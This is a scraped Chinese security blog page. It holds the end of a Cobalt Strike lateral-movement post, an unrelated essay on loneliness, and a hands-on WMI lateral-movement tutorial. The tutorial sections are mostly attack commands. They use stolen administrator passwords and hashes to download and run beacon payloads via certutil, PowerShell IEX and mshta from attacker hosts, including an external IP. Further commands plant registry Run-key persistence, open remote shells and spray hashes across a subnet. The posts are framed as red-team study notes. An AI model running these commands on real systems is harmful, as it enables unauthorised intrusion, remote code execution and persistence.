<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\192.168.3.144 create xxxxx binpath&#x3D; &quot;c:\windows\temp\services.exe&quot;</span><br><span class="line">shell sc \\192.168.3.144 start xxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828133951366.png" alt="image-20200828133951366"></p>
<p><strong>4、Remote-exec</strong> </p>
<p>​        在cobaltstrike中，使用remote-exec  module  target  command+args来尝试在远程目标主机上运行特定的程序。</p>
<p>（1）psexec</p>
<p>​        首先生成一个<strong>service类型</strong>的exe，上传到目标主机</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828140744823.png" alt="image-20200828140744823"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec psexec \\192.168.3.144 c:\windows\temp\services.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141119157.png" alt="image-20200828141119157"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141146963.png" alt="image-20200828141146963"></p>
<p>（2）WMI</p>
<p>​        使用CS生成一个exe上传到目标主机，通过remote-exec的wmi模块运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec wmi 192.168.3.144 C:\windows\temp\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141501441.png" alt="image-20200828141501441"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141509268.png" alt="image-20200828141509268"></p>
<p><strong>5、SCHTASKS</strong></p>
<p>​        同样cobaltstrike中没有集成schtasks模块，不过我们仍然可以手工运行,首先生成一个shell,将shell上传到目标服务器，使用下面的命令创建计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> shell schtasks &#x2F;create &#x2F;s 192.168.3.144 &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;windowstest666&quot; &#x2F;tr &quot;c:\windows\temp\artifact.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 00:00</span><br><span class="line">shell schtasks &#x2F;run &#x2F;tn windowstest666 &#x2F;s 192.168.3.144 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br><span class="line">shell schtasks &#x2F;F &#x2F;delete &#x2F;tn windowstest666 &#x2F;s 192.168.3.144  &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828154502358.png" alt="image-20200828154502358"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过对这些横向渗透的工具的学习，我们可以发现Crackmapexec主要使用在做批量操作时使用，impacket有很多针对不同协议进行横向移动的套件，SharpExec适合对文件操作比较好，CobaltStrike虽然横向的方式不是很多，不过针对我们也可以配合一些命令去执行。</p>
<p><strong>参考文章</strong></p>
<p><a href>知识星球-红队攻防揭秘</a></p>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></p>
<p><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/" target="_blank" rel="noopener">CrackMapExec - Ultimate Guide</a></p>
<p><a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">SharpExec-您最喜欢的.NET Bling的横向运动</a></p>
<p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">进攻性横向移动</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/23/%E5%85%B3%E4%BA%8E%E5%AD%A4%E7%8B%AC%E7%9A%84%E7%90%86%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/23/%E5%85%B3%E4%BA%8E%E5%AD%A4%E7%8B%AC%E7%9A%84%E7%90%86%E8%A7%A3/" class="post-title-link" itemprop="url">关于孤独的理解</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-08-23 22:42:46 / Modified: 22:46:29" itemprop="dateCreated datePublished" datetime="2020-08-23T22:42:46+08:00">2020-08-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>**孤独是一个人的狂欢**</code></pre><p>​        当我们越来越长大，走出了学校，走到了社会，开始参加了工作，或许我们也有些许的朋友在这个城市，或许我们也有同事可以交流，可是每到晚上回到自己的小房间，每到周末呆在房间里，没有来会有一种空虚的感觉，可能这只是我个人的感觉，不过可能在大城市工作的很多人，也有类似的感觉，我们感到空虚，孤独，可能并不一定是因为我们一个人，没有人陪伴，可能只是由于我们有了很多独自与自己相处的时间，但我们不习惯和自己相处，所以才会产生某种难以排解的苦闷。</p>
<p><strong>什么是孤独？</strong></p>
<p>百度词条如下：</p>
<p>​        孤独是一种主观自觉与他人或社会隔离与疏远的感觉和体验,而非客观状态； 是一个人生存空间和生存状态的自我封闭，孤独的人会脱离社会群体而生活在一种消极的状态之中。</p>
<p>​        首先看前半段百度对于孤独的解释，它是一种感觉。再看第二句话，它是人生存空间或者状态的自我封闭。最后孤独会使人脱离群体并且让人消极的对待生活。</p>
<p><strong>为什么会孤独？</strong></p>
<p>​        看完了百度对于孤独的解释，我们就不难理解，为什么我们很多年轻人到了大城市会时常感到孤独了。首先，在之前的生活轨迹中，我们一般很少有机会一个人在一个空间里。比如在小学，初中，高中，我们上学可能和同学一起走，放学后有家长陪伴，即使是寄宿在学校，也像上大学一样，也是几个人居住在一起的，那些时候我们可能比较少一个人在一个空间中。但是到了毕业工作以后，我们在下班以后，基本都是一个人生活在一个小房间里，再加上外卖的普及，周末甚至可以两天都不用出门，一个人呆在房间里。这就满足了一个条件，就是人的生存空间自我封闭。</p>
<p>​        关于为什么会孤独，至少在在大城市工作以后为什么容易感到孤独我有一些自己的理解。我认为之所以我们在工作后会感到孤独，主要是因为在之前的人生轨迹中，我们基本都是有人陪伴的，因此有比较和自己相处的时间会比较少，所以我们很多人包括我自己可能缺乏和自己相处的能力，正是因为缺乏这种能力，才会导致我们在房间独自一个人生活感到无所适从，就容易产生孤独这种感觉。</p>
<p><strong>如何面对孤独？</strong></p>
<p>​        既然是因为我们一个人在家里容易出现孤独的情绪，那么是不是我们只要一到周末就出去玩就不会感觉到孤独呢？这个办法比较容易理解，当我们忙起来的时候，可能就不会有时间去感受所谓孤独这种情绪，自然不会感觉到孤独，这确实是一种好办法，不过我认为也不可取，因为当我们一个人的时候，才有时间去思考很多问题，如果我们用把自己个人时间全部填满的方式去排解孤独，那我们无疑也放弃了去思考问题的时间，这些思考的时间可以帮助我们对接下来的生活进行规划，让我们更好的面对生活。因此应该给自己留一部分时间去独处。</p>
<p>​        首先对于孤独这种感觉我们应该以一个比较平常的心态去面对它。要知道我们从出生的时候就是一个人的，即便是关系最为亲密的人也不可能在每时每刻都在我们身边，所以我们总是要一个人去面对生活的，这个是没有办法摆脱的，既然无法摆脱，我们只能和解。</p>
<p>​        至于如何面对独处的时间，我认为可以从以下几点开始</p>
<ul>
<li><p>做自己喜欢的事情，比如:弹琴，画画，写写东西等等</p>
</li>
<li><p>读书，读书可以让我们在很短的时间中体会别人的生活</p>
</li>
<li><p>运动，保持一个好的身体</p>
</li>
<li><p>学习，提升个人价值和能力</p>
<p>​    当我们通过某些方式去利用独处的时间，我们甚至可能会喜欢甚至享受这段时间。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网横向移动的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-21 17:53:05" itemprop="dateCreated datePublished" datetime="2020-08-21T17:53:05+08:00">2020-08-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-28 17:02:51" itemprop="dateModified" datetime="2020-08-28T17:02:51+08:00">2020-08-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        当我们进入内网后，并且对当前主机的各种信息已经搜集完毕，接下来就到了最有意思的环节，横向移动。在这个环节，我们可以通过我们的操作获取多台主机的权限，本文将总结内网横向渗透中常用的姿势。</p>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p><strong>什么是WMI?</strong></p>
<p>​        WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于管理本地或<strong>远程</strong>的 Windows 系统。</p>
<p><strong>为什么要使用WMI？</strong></p>
<p>​        使用WMI进行横向移动，默认不会留下系统日志，并且脚本无需写入磁盘，具有隐蔽性。</p>
<p><strong>如何使用WMI?</strong></p>
<p>​        对于WMI的利用，可以使用windows自带的wmic命令来执行各种操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief 列出进程信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823225302723.png" alt="image-20200823225302723"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create &quot;calc.exe&quot;  创建进程</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230056479.png" alt="image-20200823230056479"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief 列出当前账户信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230213681.png" alt="image-20200823230213681"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption 获取启动项中的信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230935974.png" alt="image-20200823230935974"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief 查看启动的服务</span><br><span class="line">wmic service where &quot;name&#x3D;&#39;AppXSvc&#39;&quot; call startservice 启动某个服务</span><br><span class="line">wmic service where &quot;name&#x3D;&#39;AppXSvc&#39;&quot; call stopservice   停止某个服务</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231132116.png" alt="image-20200823231132116"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231144901.png" alt="image-20200823231144901"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231202869.png" alt="image-20200823231202869"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief  查看补丁</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231301814.png" alt="image-20200823231301814"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief 获取域控信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231626975.png" alt="image-20200823231626975"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version 获取安装的软件，获取的不一定全</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231739063.png" alt="image-20200823231739063"></p>
<p><strong>WMI横向渗透条件？</strong></p>
<ul>
<li>开启WMIC默认管理端口135端口</li>
<li>拥有管理员权限</li>
</ul>
<p><strong>WMI横向渗透利用</strong></p>
<p>1、使用WMIC利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.3.144 &#x2F;user:administrator &#x2F;password:Admin12345 PROCESS call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\windows\temp\result.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234153636.png" alt="image-20200823234153636"></p>
<p>使用WMIC进行横向渗透是无法获取回显的，因此可以通过建立IPC连接，通过IPC读取执行结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\192.168.3.144\c$\windows\temp\result.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234529203.png" alt="image-20200823234529203"></p>
<p>使用WMIC执行exe上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.3.144 &#x2F;user:administrator &#x2F;password:&quot;xxx&quot; PROCESS call create &quot;cmd &#x2F;c certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.exe c:&#x2F;windows&#x2F;temp&#x2F;windwn.exe &amp; c:&#x2F;windows&#x2F;temp&#x2F;windwn.exe &amp; certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.exe delete&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824095347428.png" alt="image-20200824095347428"></p>
<p>使用WMIC执行powershell上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NODE:192.168.3.144 &#x2F;user:&quot;administrator&quot; &#x2F;password:&quot;xxx&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.3.99&#x2F;beacon.ps1&#39;);\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824100644862.png" alt="image-20200824100644862"></p>
<p>使用WMIC修改注册表权限维持</p>
<p>​        首先将我们生成的马放到边界主机上，使用IPC将马移动到目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.144\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp; xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.144\admin$\temp &amp; net use \\192.168.3.144\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824101718854.png" alt="image-20200824101718854"></p>
<p>​        操作注册表，将文件写入到启动项中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NODE:&quot;192.168.3.144&quot; &#x2F;USER:&quot;administrator&quot; &#x2F;PASSWORD:&quot;xxx&quot; process call create &quot;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v \&quot;shell\&quot; &#x2F;t REG_SZ &#x2F;d \&quot;C:\windows\temp\artifact.exe\&quot; &#x2F;f&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102054065.png" alt="image-20200824102054065"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102157796.png" alt="image-20200824102157796"></p>
<p>2、使用wmiexec.vbs利用</p>
<p>​        直接使用原生的wmic利用有一个缺陷，就是不能获取返回的内容，使用wmiexe.vbs可以获取到执行的结果，其原理就是先将执行后的结果输出到文件中，再与目标建立IPC连接，查看文件的内容，因此这种利用方式不仅需要目标开启135，也需要开启445,否则无法获取执行后的结果。</p>
<p>​        使用wmiexec.vbs执行命令并获取结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.3.144 administrator &quot;xxxx&quot; &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103002551.png" alt="image-20200824103002551"></p>
<p>​        使用wmiexec获取半交互的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;shell 192.168.3.144 administrator &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103755336.png" alt="image-20200824103755336"></p>
<p>3、使用impacket套件利用</p>
<p>​        在windows下，有已经打包成exe的impacket利用套件，当我们仅仅得到hash而没有得到密码时，可以通过wmiexec.exe来进行横向移动。<strong>hash的值需要区分大小写，否则会执行失败</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824111121993.png" alt="image-20200824111121993"></p>
<p>​        也可以使用wmiexec.exe通过密码进行验证来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120039093.png" alt="image-20200824120039093"></p>
<p>​        也可以获取半交互的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120200887.png" alt="image-20200824120200887"></p>
<p>4、使用Invoke-WMIExec利用</p>
<p>​        当只有hash时，也可以通过Invoke-WMIExec来进行横向渗透，不过这种方式无法获取执行后的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &quot;whoami&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824112842144.png" alt="image-20200824112842144"></p>
<p>​        如果在cs上执行，需要将powershell的双引号转义一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#39;whoami&#39; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824113324458.png" alt="image-20200824113324458"></p>
<p>​     在目标可以出外网的情况下，可以使用cs生成一个hta文件，再远程加载hta文件达到上线的目的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#39;mshta http:&#x2F;&#x2F;111.229.70.13:801&#x2F;evil.hta&#39; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114313078.png" alt="image-20200824114313078"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114350510.png" alt="image-20200824114350510"></p>
<p>​        我们也可以同时导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1来探测同C段中用户hash是否相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#39;);IEX (New-Object Net.WebClient).DownloadString(&#39;C:\Users\jerry\Desktop\Invoke-TheHash.ps1&#39;);Invoke-TheHash -Type WMIExec -Target 192.168.3.0&#x2F;24 -Username administrator -Hash xxx&quot;&quot;</span><br></pre></td></tr></table></figure>

